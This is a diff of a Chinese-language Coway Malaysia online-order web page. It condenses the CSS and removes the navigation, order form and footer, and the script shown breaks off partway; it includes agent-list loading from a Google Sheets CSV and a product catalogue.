@@ -4,111 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Coway Malaysia | 在线下单</title>
+    <link rel="stylesheet" href="css/common.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            font-size: 15px;
-            line-height: 1.5;
-            color: #2c3e50;
-            background: linear-gradient(135deg, #f5f7fa 0%, #e8ecf1 100%);
-            padding-top: 70px;
-        }
-        
-        /* ========== 导航栏 ========== */
-        .navbar {
-            position: fixed;
-            top: 0; left: 0; right: 0;
-            background: rgba(255,255,255,0.95);
-            backdrop-filter: blur(10px);
-            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
-            z-index: 1000;
-            padding: 12px 20px;
-        }
-        .nav-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 22px;
-            font-weight: 700;
-            color: #80abce;
-            text-decoration: none;
-        }
-        .logo i { font-size: 28px; }
-        .nav-menu { display: flex; gap: 25px; align-items: center; }
-        .nav-menu a {
-            text-decoration: none;
-            color: #555;
-            font-size: 14px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            transition: color 0.3s;
-            padding: 8px 0;
-            border-bottom: 2px solid transparent;
-        }
-        .nav-menu a:hover, .nav-menu a.active {
-            color: #80abce;
-            border-bottom-color: #80abce;
-        }
-        .btn-order-nav {
-            background: #80abce;
-            color: #fff !important;
-            padding: 10px 28px !important;
-            border-radius: 40px !important;
-            border-bottom: none !important;
-            box-shadow: 0 4px 12px rgba(128,171,206,0.3);
-        }
-        .btn-order-nav:hover {
-            background: #6a9ab8;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(128,171,206,0.4);
-        }
-        .mobile-menu-btn {
-            display: none;
-            background: none;
-            border: none;
-            font-size: 24px;
-            cursor: pointer;
-            color: #555;
-        }
-        
-        .mobile-sidebar {
-            position: fixed;
-            top: 0; right: -280px;
-            width: 280px; height: 100%;
-            background: #fff;
-            z-index: 1001;
-            transition: right 0.3s;
-            padding: 70px 25px;
-            box-shadow: -5px 0 30px rgba(0,0,0,0.1);
-        }
-        .mobile-sidebar.open { right: 0; }
-        .mobile-sidebar a {
-            display: block;
-            padding: 14px 0;
-            color: #555;
-            text-decoration: none;
-            font-weight: 500;
-            border-bottom: 1px solid #eee;
-        }
-        .overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.4);
-            backdrop-filter: blur(3px);
-            z-index: 1000;
-        }
-        .overlay.show { display: block; }
-        
         /* ========== 轮播广告牌 ========== */
         .carousel-banner {
             width: 100%;
@@ -147,488 +46,147 @@
             padding: 20px;
             animation: fadeInUp 0.8s ease;
         }
-        .carousel-content h2 {
-            font-size: 48px;
-            font-weight: 700;
-            margin-bottom: 15px;
-            text-shadow: 2px 2px 10px rgba(0,0,0,0.3);
-        }
-        .carousel-content p {
-            font-size: 18px;
-            margin-bottom: 25px;
-            text-shadow: 1px 1px 5px rgba(0,0,0,0.3);
-        }
+        .carousel-content h2 { font-size: 48px; margin-bottom: 15px; text-shadow: 2px 2px 10px rgba(0,0,0,0.3); }
+        .carousel-content p { font-size: 18px; margin-bottom: 25px; text-shadow: 1px 1px 5px rgba(0,0,0,0.3); }
         .carousel-content a {
-            background: #fff;
-            color: #2c3e50;
-            padding: 12px 36px;
-            border-radius: 40px;
-            text-decoration: none;
-            font-weight: 600;
-            transition: all 0.3s;
-            display: inline-block;
+            background: #fff; color: #2c3e50; padding: 12px 36px; border-radius: 40px;
+            text-decoration: none; font-weight: 600; transition: all 0.3s; display: inline-block;
         }
-        .carousel-content a:hover {
-            background: #80abce;
-            color: #fff;
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-        }
-        
+        .carousel-content a:hover { background: #80abce; color: #fff; transform: translateY(-3px); }
         .carousel-dots {
-            position: absolute;
-            bottom: 25px; left: 0; right: 0;
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            z-index: 10;
+            position: absolute; bottom: 25px; left: 0; right: 0;
+            display: flex; justify-content: center; gap: 10px; z-index: 10;
         }
         .carousel-dot {
-            width: 10px; height: 10px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.5);
-            cursor: pointer;
-            transition: all 0.3s;
+            width: 10px; height: 10px; border-radius: 50%;
+            background: rgba(255,255,255,0.5); cursor: pointer; transition: all 0.3s;
         }
-        .carousel-dot.active {
-            background: #fff;
-            width: 28px;
-            border-radius: 5px;
-        }
+        .carousel-dot.active { background: #fff; width: 28px; border-radius: 5px; }
         .carousel-prev, .carousel-next {
-            position: absolute;
-            top: 50%; transform: translateY(-50%);
-            width: 44px; height: 44px;
-            background: rgba(255,255,255,0.2);
-            backdrop-filter: blur(5px);
-            color: #fff;
-            border: none;
-            border-radius: 50%;
-            cursor: pointer;
-            font-size: 24px;
-            z-index: 10;
-            transition: all 0.3s;
+            position: absolute; top: 50%; transform: translateY(-50%);
+            width: 44px; height: 44px; background: rgba(255,255,255,0.2);
+            backdrop-filter: blur(5px); color: #fff; border: none; border-radius: 50%;
+            cursor: pointer; font-size: 24px; z-index: 10; transition: all 0.3s;
         }
-        .carousel-prev:hover, .carousel-next:hover {
-            background: rgba(255,255,255,0.4);
-            transform: translateY(-50%) scale(1.05);
-        }
+        .carousel-prev:hover, .carousel-next:hover { background: rgba(255,255,255,0.4); transform: translateY(-50%) scale(1.05); }
         .carousel-prev { left: 25px; }
         .carousel-next { right: 25px; }
-        
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
         
         /* ========== 主内容布局 ========== */
         .main-layout {
-            max-width: 1400px;
-            margin: 40px auto;
-            padding: 0 20px;
-            display: flex;
-            gap: 30px;
+            max-width: 1400px; margin: 40px auto; padding: 0 20px;
+            display: flex; gap: 30px;
         }
-        
-        /* ========== 左侧分类栏 ========== */
         .category-sidebar {
-            width: 280px;
-            flex-shrink: 0;
-            background: #fff;
-            border-radius: 20px;
-            box-shadow: 0 5px 25px rgba(0,0,0,0.05);
-            overflow: hidden;
-            height: fit-content;
-            position: sticky;
-            top: 85px;
+            width: 280px; flex-shrink: 0; background: #fff; border-radius: 20px;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.05); overflow: hidden;
+            height: fit-content; position: sticky; top: 85px;
             border: 1px solid rgba(128,171,206,0.1);
         }
         .category-header {
-            background: linear-gradient(135deg, #80abce, #a8d0e6);
-            color: #fff;
-            padding: 18px 20px;
-            font-weight: 700;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            background: linear-gradient(135deg, #80abce, #a8d0e6); color: #fff;
+            padding: 18px 20px; font-weight: 700; font-size: 18px;
+            display: flex; align-items: center; gap: 10px;
         }
         .category-list { list-style: none; }
         .category-item {
-            padding: 15px 20px;
-            border-bottom: 1px solid #f0f0f0;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            transition: all 0.25s;
-            font-weight: 500;
-            color: #555;
+            padding: 15px 20px; border-bottom: 1px solid #f0f0f0; cursor: pointer;
+            display: flex; align-items: center; gap: 12px; transition: all 0.25s;
+            font-weight: 500; color: #555;
         }
-        .category-item:hover {
-            background: #f8fafc;
-            color: #80abce;
-        }
+        .category-item:hover { background: #f8fafc; color: #80abce; }
         .category-item.active {
             background: linear-gradient(90deg, #e8f0f8 0%, #fff 100%);
-            color: #80abce;
-            border-left: 4px solid #80abce;
-            font-weight: 600;
+            color: #80abce; border-left: 4px solid #80abce; font-weight: 600;
         }
         .category-item i { font-size: 20px; width: 24px; }
-        
-        /* ========== 右侧产品网格 ========== */
         .products-area { flex: 1; }
         .products-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
+            display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px;
         }
         .current-category {
-            font-size: 26px;
-            font-weight: 700;
-            color: #2c3e50;
-            display: flex;
-            align-items: center;
-            gap: 12px;
+            font-size: 26px; font-weight: 700; color: #2c3e50;
+            display: flex; align-items: center; gap: 12px;
         }
-        .current-category i { color: #80abce; }
         .products-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 25px;
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 25px;
         }
         .product-card {
-            background: #fff;
-            border-radius: 20px;
-            overflow: hidden;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.05);
+            background: #fff; border-radius: 20px; overflow: hidden; cursor: pointer;
+            transition: all 0.3s; box-shadow: 0 5px 20px rgba(0,0,0,0.05);
             border: 1px solid rgba(128,171,206,0.1);
         }
-        .product-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.12);
-            border-color: #80abce;
-        }
-        .product-card img {
-            width: 100%;
-            height: 200px;
-            object-fit: cover;
-            transition: transform 0.5s;
-        }
+        .product-card:hover { transform: translateY(-8px); box-shadow: 0 20px 40px rgba(0,0,0,0.12); border-color: #80abce; }
+        .product-card img { width: 100%; height: 200px; object-fit: cover; transition: transform 0.5s; }
         .product-card:hover img { transform: scale(1.05); }
         .product-card .info { padding: 20px; }
-        .product-card h4 {
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            color: #2c3e50;
-        }
-        .product-card p {
-            font-size: 13px;
-            color: #7f8c8d;
-            margin-bottom: 12px;
-            line-height: 1.5;
-        }
-        .product-card .price {
-            color: #80abce;
-            font-weight: 700;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        .product-card .price i { font-size: 16px; }
+        .product-card h4 { font-size: 18px; font-weight: 700; margin-bottom: 8px; color: #2c3e50; }
+        .product-card p { font-size: 13px; color: #7f8c8d; margin-bottom: 12px; line-height: 1.5; }
+        .product-card .price { color: #80abce; font-weight: 700; font-size: 18px; display: flex; align-items: center; gap: 5px; }
         
-        /* ========== 详情弹窗 ========== */
-        .detail-modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(5px);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
+        /* ========== 弹窗样式 ========== */
+        .detail-modal, .order-modal, .success-modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 2000;
+            justify-content: center; align-items: center;
         }
-        .detail-modal.active { display: flex; }
-        .detail-content {
-            background: #fff;
-            max-width: 750px;
-            width: 90%;
-            max-height: 85vh;
-            overflow-y: auto;
-            border-radius: 24px;
-            padding: 30px;
-            position: relative;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
+        .detail-modal.active, .order-modal.active, .success-modal.active { display: flex; }
+        .order-modal { z-index: 2001; }
+        .success-modal { z-index: 2002; }
+        .detail-content, .order-content, .success-content {
+            background: #fff; border-radius: 24px; padding: 30px; position: relative;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.3); max-height: 85vh; overflow-y: auto;
         }
-        .modal-close {
-            position: absolute;
-            top: 20px; right: 25px;
-            font-size: 28px;
-            cursor: pointer;
-            color: #999;
-            transition: color 0.3s;
-            z-index: 10;
-        }
+        .detail-content { max-width: 750px; width: 90%; }
+        .order-content { max-width: 650px; width: 90%; }
+        .success-content { max-width: 450px; width: 90%; text-align: center; padding: 35px; }
+        .modal-close { position: absolute; top: 20px; right: 25px; font-size: 28px; cursor: pointer; color: #999; z-index: 10; }
         .modal-close:hover { color: #e74c3c; }
-        .detail-carousel img {
-            width: 100%;
-            border-radius: 16px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
-        }
-        .detail-title {
-            font-size: 28px;
-            font-weight: 700;
-            margin: 20px 0 10px;
-            color: #2c3e50;
-        }
-        .detail-price {
-            color: #80abce;
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 15px;
-        }
-        .detail-desc {
-            color: #666;
-            line-height: 1.7;
-            margin-bottom: 25px;
-            padding: 15px;
-            background: #f8fafc;
-            border-radius: 12px;
-        }
-        .btn-translate {
-            background: #f0f0f0;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 30px;
-            cursor: pointer;
-            margin-bottom: 20px;
-            font-weight: 500;
-            transition: all 0.3s;
-        }
-        .btn-translate:hover { background: #e0e0e0; }
-        .detail-actions {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
+        .detail-carousel img { width: 100%; border-radius: 16px; }
+        .detail-title { font-size: 28px; font-weight: 700; margin: 20px 0 10px; color: #2c3e50; }
+        .detail-price { color: #80abce; font-size: 24px; font-weight: 700; margin-bottom: 15px; }
+        .detail-desc { color: #666; line-height: 1.7; margin-bottom: 25px; padding: 15px; background: #f8fafc; border-radius: 12px; }
+        .btn-translate { background: #f0f0f0; border: none; padding: 10px 20px; border-radius: 30px; cursor: pointer; margin-bottom: 20px; }
+        .detail-actions { display: flex; gap: 15px; flex-wrap: wrap; }
         .btn-order-detail, .btn-contact-detail {
-            padding: 14px 28px;
-            border-radius: 40px;
-            border: none;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 16px;
+            padding: 14px 28px; border-radius: 40px; border: none; font-weight: 600;
+            cursor: pointer; transition: all 0.3s; display: flex; align-items: center; gap: 8px; font-size: 16px;
         }
-        .btn-order-detail {
-            background: #80abce;
-            color: #fff;
-            box-shadow: 0 4px 15px rgba(128,171,206,0.3);
-        }
-        .btn-order-detail:hover {
-            background: #6a9ab8;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(128,171,206,0.4);
-        }
-        .btn-contact-detail {
-            background: #fff;
-            border: 2px solid #80abce;
-            color: #80abce;
-        }
-        .btn-contact-detail:hover {
-            background: #80abce;
-            color: #fff;
-        }
-        
-        /* ========== 订单表单弹窗 ========== */
-        .order-modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(5px);
-            z-index: 2001;
-            justify-content: center;
-            align-items: center;
-        }
-        .order-modal.active { display: flex; }
-        .order-content {
-            background: #fff;
-            max-width: 650px;
-            width: 90%;
-            max-height: 85vh;
-            overflow-y: auto;
-            border-radius: 24px;
-            padding: 30px;
-            position: relative;
-        }
-        .order-content h3 {
-            font-size: 24px;
-            color: #80abce;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
+        .btn-order-detail { background: #80abce; color: #fff; }
+        .btn-order-detail:hover { background: #6a9ab8; }
+        .btn-contact-detail { background: #fff; border: 2px solid #80abce; color: #80abce; }
+        .btn-contact-detail:hover { background: #80abce; color: #fff; }
+        .order-content h3 { font-size: 24px; color: #80abce; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
         .selected-product-info {
-            background: linear-gradient(135deg, #e8f0f8, #f0f6fa);
-            padding: 18px;
-            border-radius: 16px;
-            margin-bottom: 25px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-left: 4px solid #80abce;
+            background: linear-gradient(135deg, #e8f0f8, #f0f6fa); padding: 18px; border-radius: 16px;
+            margin-bottom: 25px; display: flex; justify-content: space-between; border-left: 4px solid #80abce;
         }
         .form-group { margin-bottom: 20px; }
-        .form-group label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #2c3e50;
-        }
+        .form-group label { display: block; font-weight: 600; margin-bottom: 8px; color: #2c3e50; }
         .form-group input, .form-group textarea {
-            width: 100%;
-            padding: 12px 16px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            transition: all 0.3s;
-            font-size: 15px;
-            background: #fafbfc;
+            width: 100%; padding: 12px 16px; border: 2px solid #e0e0e0; border-radius: 12px;
+            font-size: 15px; background: #fafbfc;
         }
-        .form-group input:focus, .form-group textarea:focus {
-            outline: none;
-            border-color: #80abce;
-            background: #fff;
-            box-shadow: 0 0 0 3px rgba(128,171,206,0.1);
-        }
-        .form-row2 {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-        }
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-        .checkbox-group input {
-            width: 20px; height: 20px;
-            cursor: pointer;
-            accent-color: #80abce;
-        }
-        .checkbox-group label { margin: 0; cursor: pointer; }
+        .form-group input:focus, .form-group textarea:focus { outline: none; border-color: #80abce; }
+        .form-row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .checkbox-group { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
+        .checkbox-group input { width: 20px; height: 20px; accent-color: #80abce; }
         .delivery-address { display: none; }
         .delivery-address.show { display: block; }
         .btn-submit {
-            background: #80abce;
-            color: #fff;
-            border: none;
-            padding: 16px;
-            border-radius: 40px;
-            width: 100%;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 10px;
+            background: #80abce; color: #fff; border: none; padding: 16px; border-radius: 40px;
+            width: 100%; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px;
         }
-        .btn-submit:hover {
-            background: #6a9ab8;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(128,171,206,0.3);
-        }
-        
-        /* ========== 成功弹窗 ========== */
-        .success-modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(5px);
-            z-index: 2002;
-            justify-content: center;
-            align-items: center;
-        }
-        .success-modal.active { display: flex; }
-        .success-content {
-            background: #fff;
-            max-width: 450px;
-            width: 90%;
-            border-radius: 24px;
-            padding: 35px;
-            text-align: center;
-        }
+        .btn-submit:hover { background: #6a9ab8; }
         .success-icon {
-            width: 80px; height: 80px;
-            background: #27ae60;
-            color: #fff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 40px;
-            margin: 0 auto 20px;
+            width: 80px; height: 80px; background: #27ae60; color: #fff; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; font-size: 40px; margin: 0 auto 20px;
         }
-        .success-content h3 {
-            font-size: 24px;
-            margin-bottom: 15px;
-            color: #2c3e50;
-        }
-        .success-content p {
-            color: #666;
-            margin-bottom: 25px;
-            line-height: 1.7;
-        }
-        .btn-ok {
-            background: #80abce;
-            color: #fff;
-            border: none;
-            padding: 12px 40px;
-            border-radius: 40px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        .btn-ok:hover {
-            background: #6a9ab8;
-            transform: translateY(-2px);
-        }
+        .success-content h3 { font-size: 24px; margin-bottom: 15px; color: #2c3e50; }
+        .success-content p { color: #666; margin-bottom: 25px; }
+        .btn-ok { background: #80abce; color: #fff; border: none; padding: 12px 40px; border-radius: 40px; font-size: 16px; font-weight: 600; cursor: pointer; }
         
-        /* ========== 页脚 ========== */
-        footer {
-            background: linear-gradient(135deg, #2c3e50, #34495e);
-            color: #ccc;
-            padding: 50px 20px 30px;
-            text-align: center;
-            margin-top: 60px;
-        }
-        footer a {
-            color: #aaa;
-            text-decoration: none;
-            margin: 0 12px;
-            transition: color 0.3s;
-        }
-        footer a:hover { color: #80abce; }
-        .footer-divider {
-            width: 60px; height: 2px;
-            background: #80abce;
-            margin: 20px auto;
-            border-radius: 2px;
-        }
-        
-        /* ========== 响应式 ========== */
         @media (max-width: 900px) {
             .main-layout { flex-direction: column; }
             .category-sidebar { width: 100%; position: static; }
@@ -638,522 +196,88 @@
             .carousel-content h2 { font-size: 28px; }
         }
         @media (max-width: 768px) {
-            .nav-menu { display: none; }
-            .mobile-menu-btn { display: block; }
-            body { padding-top: 60px; }
             .form-row2 { grid-template-columns: 1fr; }
             .detail-actions { flex-direction: column; }
-            .btn-order-detail, .btn-contact-detail { justify-content: center; }
         }
     </style>
-    <!-- Slick Carousel CSS -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css">
 </head>
 <body>
-
-<!-- 导航栏 -->
-<div class="navbar">
-    <div class="nav-container">
-        <a href="index.html" class="logo"><img src="https://www.coway.com.my/img/coway-malaysia-logo.png" alt="Coway Malaysia"></a>
-       <div class="nav-menu">
-    <a href="list.html" class="btn-order-nav">Order Now</a>
-    <a href="location.html">Locations</a>
-    <a href="support.html">Support</a>
-    <a href="about.html">About Us</a>
-</div>
-<a href="admin.html" class="admin-icon" title="管理员登录">👤</a>
-        <button class="mobile-menu-btn" id="menuBtn">☰</button>
+    <div class="carousel-banner">
+        <div class="carousel-slides" id="carouselSlides"></div>
+        <button class="carousel-prev" id="carouselPrev">‹</button>
+        <button class="carousel-next" id="carouselNext">›</button>
+        <div class="carousel-dots" id="carouselDots"></div>
     </div>
-</div>
 
-<div class="mobile-sidebar" id="sidebar">
-    <a href="list.html">Order Now</a>
-    <a href="location.html">Locations</a>
-    <a href="support.html">Support</a>
-    <a href="about.html">About Us</a>
-</div>
-<div class="overlay" id="overlay"></div>
-
-<!-- 轮播广告牌 -->
-<div class="carousel-banner">
-    <div class="carousel-slides" id="carouselSlides"></div>
-    <button class="carousel-prev" id="carouselPrev">‹</button>
-    <button class="carousel-next" id="carouselNext">›</button>
-    <div class="carousel-dots" id="carouselDots"></div>
-</div>
-
-<!-- 主内容 -->
-<div class="main-layout">
-    <div class="category-sidebar">
-        <div class="category-header">
-            <i>📋</i> 产品分类
+    <div class="main-layout">
+        <div class="category-sidebar">
+            <div class="category-header"><i>📋</i> 产品分类</div>
+            <ul class="category-list" id="categoryList"></ul>
         </div>
-        <ul class="category-list" id="categoryList"></ul>
-    </div>
-    <div class="products-area">
-        <div class="products-header">
-            <div class="current-category" id="currentCategory">
-                <i>🛍️</i> 全部产品
+        <div class="products-area">
+            <div class="products-header">
+                <div class="current-category" id="currentCategory"><i>🛍️</i> 全部产品</div>
             </div>
-        </div>
-        <div id="productsGrid" class="products-grid"></div>
-    </div>
-</div>
-
-<!-- 产品详情弹窗 -->
-<div id="detailModal" class="detail-modal">
-    <div class="detail-content">
-        <span class="modal-close" onclick="closeDetailModal()">&times;</span>
-        <div id="detailCarousel" class="detail-carousel"></div>
-        <div class="detail-title" id="detailTitle"></div>
-        <div class="detail-price" id="detailPrice"></div>
-        <div class="detail-desc" id="detailDesc"></div>
-        <button id="translateBtn" class="btn-translate">🌐 切换英文</button>
-        <div class="detail-actions">
-            <button id="orderFromDetailBtn" class="btn-order-detail">📦 立即订购</button>
-            <button id="contactFromDetailBtn" class="btn-contact-detail">💬 联系代理</button>
+            <div id="productsGrid" class="products-grid"></div>
         </div>
     </div>
-</div>
 
-<!-- 订单表单弹窗 -->
-<div id="orderModal" class="order-modal">
-    <div class="order-content">
-        <span class="modal-close" onclick="closeOrderModal()">&times;</span>
-        <h3><i>📝</i> 填写订单信息</h3>
-        <div class="selected-product-info" id="selectedProductInfo"></div>
-        <p style="background:#e8f5e9; padding:14px; border-radius:12px; margin-bottom:25px; color:#27ae60;">
-            <i>✅</i> 感谢您的订购！请填写以下信息完成注册。
-        </p>
-        <form id="orderForm">
-            <div class="form-group">
-                <label>📎 IC 照片 (正面) *</label>
-                <input type="file" id="icUpload" accept="image/*">
+    <div id="detailModal" class="detail-modal">
+        <div class="detail-content">
+            <span class="modal-close" onclick="closeDetailModal()">&times;</span>
+            <div id="detailCarousel" class="detail-carousel"></div>
+            <div class="detail-title" id="detailTitle"></div>
+            <div class="detail-price" id="detailPrice"></div>
+            <div class="detail-desc" id="detailDesc"></div>
+            <button id="translateBtn" class="btn-translate">🌐 切换英文</button>
+            <div class="detail-actions">
+                <button id="orderFromDetailBtn" class="btn-order-detail">📦 立即订购</button>
+                <button id="contactFromDetailBtn" class="btn-contact-detail">💬 联系代理</button>
             </div>
-            <div class="form-row2">
-                <div class="form-group">
-                    <label>📞 联系电话 #1 *</label>
-                    <input type="tel" id="contact1" placeholder="例如: 0123456789" required>
-                </div>
-                <div class="form-group">
-                    <label>📞 联系电话 #2</label>
-                    <input type="tel" id="contact2" placeholder="备用号码">
-                </div>
-            </div>
-            <div class="form-group">
-                <label>🏠 安装地址 *</label>
-                <textarea id="address" rows="2" placeholder="请输入详细安装地址" required></textarea>
-            </div>
-            <div class="checkbox-group">
-                <input type="checkbox" id="differentDelivery">
-                <label for="differentDelivery">📦 送货地址与安装地址不同</label>
-            </div>
-            <div class="form-group delivery-address" id="deliveryAddressGroup">
-                <label>🚚 送货地址</label>
-                <textarea id="deliveryAddress" rows="2" placeholder="请输入送货地址"></textarea>
-            </div>
-            <div class="form-group">
-                <label>📧 电子邮箱 *</label>
-                <input type="email" id="email" placeholder="your@email.com" required>
-            </div>
-            <div class="form-row2">
-                <div class="form-group">
-                    <label>💳 银行卡 (前6位)</label>
-                    <input type="text" id="cardFirst6" placeholder="123456" maxlength="6">
-                </div>
-                <div class="form-group">
-                    <label>💳 银行卡 (后4位)</label>
-                    <input type="text" id="cardLast4" placeholder="7890" maxlength="4">
-                </div>
-            </div>
-            <button type="submit" class="btn-submit">✅ 提交订单</button>
-        </form>
+        </div>
     </div>
-</div>
 
-<!-- 成功弹窗 -->
-<div id="successModal" class="success-modal">
-    <div class="success-content">
-        <div class="success-icon">✓</div>
-        <h3>订单提交成功！</h3>
-        <p>感谢您提交的详细信息。<br><br>我们将尽快处理您的订单，并将PDF文件发送给您签署。<br><br>请及时签署并返回文件以完成注册流程。</p>
-        <button class="btn-ok" onclick="closeSuccessModal()">确定</button>
-    </div>
-</div>
-
-<!-- 页脚 -->
-<footer>
-    <div>
-        <a href="terms.html">使用条款</a> •
-        <a href="privacy.html">隐私政策</a> •
-        <a href="#">常见问题</a>
-    </div>
-    <div class="footer-divider"></div>
-    <div>COWAY (MALAYSIA) © 2026. All Rights Reserved.</div>
-</footer>
-
-<!-- 依赖库 -->
-<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
-
-<script>
-    // ========== 全局变量 ==========
-    let productsData = { all: [], water: [], air: [], ac: [], washer: [], toilet: [], massageChair: [], massageBed: [], bed: [] };
-    let carouselData = [];
-    let currentCategory = "all";
-    let currentProduct = null;
-    let currentLang = 'zh';
-    let currentCarouselSlide = 0;
-    let carouselInterval = null;
-    let agentList = [];
-    
-    // 分类定义
-    const categories = [
-        { id: "all", name: "全部产品", icon: "🛍️" },
-        { id: "water", name: "水机", icon: "💧" },
-        { id: "air", name: "空气净化器", icon: "🌬️" },
-        { id: "ac", name: "冷气机", icon: "❄️" },
-        { id: "washer", name: "洗衣机", icon: "🧺" },
-        { id: "toilet", name: "马桶", icon: "🚽" },
-        { id: "massageChair", name: "按摩椅", icon: "💆" },
-        { id: "massageBed", name: "按摩床", icon: "🛏️" },
-        { id: "bed", name: "床", icon: "🛌" }
-    ];
-
-    // ========== 加载 Agent ==========
-    async function loadAgents() {
-        try {
-            const csvUrl = 'https://docs.google.com/spreadsheets/d/1uYkUTabIRRDhVh_eDfBOZUjwe8Qlv-L6eTwN2FroIAY/export?format=csv';
-            const response = await fetch(csvUrl);
-            const csvText = await response.text();
-            const rows = csvText.trim().split('\n');
-            const headers = rows[0].split(',').map(h => h.replace(/"/g, '').trim());
-            agentList = [];
-            for (let i = 1; i < rows.length; i++) {
-                if (!rows[i].trim()) continue;
-                const values = rows[i].split(',').map(v => v.replace(/"/g, '').trim());
-                agentList.push({
-                    id: parseInt(values[0]) || i,
-                    name: values[1] || '',
-                    hp_code: values[2] || '',
-                    contact: values[3] || '',
-                    position: values[4] || 'HP',
-                    receipt: parseInt(values[5]) || 0,
-                    email: values[6] || ''
-                });
-            }
-            localStorage.setItem('coway_agents', JSON.stringify(agentList));
-        } catch (error) {
-            let cached = localStorage.getItem('coway_agents');
-            if (cached) agentList = JSON.parse(cached);
-            else {
-                agentList = [
-                    { id: 1, name: "Ali Rehman", hp_code: "HP001", contact: "60123456789", position: "HP", receipt: 0, email: "ali@coway.com" },
-                    { id: 2, name: "Siti Nuraini", hp_code: "HP002", contact: "60129876543", position: "SM", receipt: 0, email: "siti@coway.com" },
-                    { id: 3, name: "Chong Wei", hp_code: "HP003", contact: "60115551234", position: "GSM", receipt: 1, email: "chong@coway.com" }
-                ];
-            }
-        }
-    }
-    
-    function getLeastBusyAgent() {
-        if (!agentList.length) return null;
-        let min = Math.min(...agentList.map(a => a.receipt));
-        return agentList.find(a => a.receipt === min);
-    }
-
-    function incrementAgentReceipt(agent) {
-        if (agent) {
-            agent.receipt++;
-            localStorage.setItem('coway_agents', JSON.stringify(agentList));
-        }
-    }
-
-    // ========== 加载产品 ==========
-    function loadProducts() {
-        let saved = localStorage.getItem('coway_products');
-        if (saved) {
